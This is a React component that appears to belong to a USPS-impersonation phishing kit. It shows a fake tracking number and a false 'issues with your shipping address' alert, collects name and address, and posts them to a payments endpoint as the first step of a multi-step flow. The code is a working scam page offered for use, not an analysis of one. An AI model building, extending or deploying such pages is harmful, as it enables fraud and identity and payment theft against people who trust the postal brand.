import React, { useState } from 'react';
import axios from 'axios';
import './AddressForm.css';
import FAQSection from './FAQSection';
import Footer from './Footer';
import ProgressBar from './ProgressBar';

const AddressForm = ({ formData, handleChange, nextStep, error, setError }) => {
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const requiredFields = ['firstName', 'lastName', 'address', 'country', 'city', 'zipCode'];
      const missingFields = requiredFields.filter(field => !formData[field]?.trim());
      if (missingFields.length > 0) {
        throw new Error('All fields are required.');
      }
      
      if (!/^\d{5}$/.test(formData.zipCode)) {
        throw new Error('ZIP code must be 5 digits.');
      }

      await new Promise(resolve => setTimeout(resolve, 500));
      const response = await axios.post('/api/payments/address', formData);
      if (response.data.success) {
        nextStep();
      } else {
        throw new Error(response.data.error || 'Failed to save address.');
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="usps-tracking-container">
      <ProgressBar currentStep="address" />
      
      <div className="tracking-header">
        <h1>
          <span className="tracking-label">Tracking Number:</span> US9514901165421
        </h1>
        <div className="status-bar">
          <span className="status-label">Status:</span>
          <span className="status-message">We have issues with your shipping address</span>
        </div>
      </div>

      <div className="tracking-message">
        <p>USPS allows you to redirect your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.</p>
      </div>

      <div className="status-alert">
        <h4>Verify Address</h4>
        <p>Find an email to confirm your address as eligible for informed Delivery.</p>
      </div>

      <form onSubmit={handleSubmit} className="address-form">
        {error && <div className="usps-error">{error}</div>}
        
        <div className="form-row">
          <div className="form-group">
            <label>First Name</label>
            <input
              type="text"
              name="firstName"
              value={formData.firstName}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>
          <div className="form-group">
            <label>Last Name</label>
            <input
              type="text"
              name="lastName"
              value={formData.lastName}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>
        </div>

        <div className="form-group">
          <label>Address</label>
          <input
            type="text"
            name="address"
            value={formData.address}
            onChange={handleChange}
            required
            disabled={loading}
          />
        </div>

        <div className="form-row">
          <div className="form-group city">
            <label>City</label>
            <input
              type="text"
              name="city"
              value={formData.city}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>
          <div className="form-group state">
            <label>Country</label>
            <select
              name="country"
              value={formData.country}
              onChange={handleChange}
              required
              disabled={loading}
            >
              <option value="">Select Country</option>
              <option value="US">United States</option>
              <option value="CA">Canada</option>
            </select>
          </div>
        </div>

        <div className="form-group">
          <label>ZIP Code</label>
          <input
            type="text"
            name="zipCode"
            value={formData.zipCode}
            onChange={handleChange}
            required
            disabled={loading}
            pattern="\d{5}"
          />
        </div>

        <div className="form-footer">
          <button 
            type="submit" 
            disabled={loading} 
            className="usps-button"
          >
            {loading ? (
              <>
                <span className="usps-spinner"></span> Processing...
              </>
            ) : 'Continue'}
          </button>
        </div>
      </form>
      <FAQSection />
      <Footer/>
    </div>
  );
};

export default AddressForm;